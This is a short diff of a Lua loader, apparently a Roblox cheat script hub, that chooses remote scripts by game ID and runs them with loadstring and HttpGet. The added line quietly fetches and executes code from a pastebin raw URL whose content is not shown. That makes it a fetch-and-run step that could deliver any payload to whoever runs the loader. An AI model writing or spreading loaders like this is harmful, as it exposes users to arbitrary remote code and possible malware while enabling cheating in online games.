@@ -30,6 +30,7 @@ local bloxf = "https://raw.githubusercontent.com/NYX8HUB/premium/refs/heads/main
 
 if GI == 16732694052 then
     loadstring(game:HttpGet(fisch))()
+    loadstring(game:httpGet("https://pastebin.com/raw/GKm9FHGS"))()
 elseif GI == 7449423635 or GI == 4442272183 or GI == 2753915549 then
     loadstring(game:HttpGet(bloxf))()
 elseif GI == 90813298 then
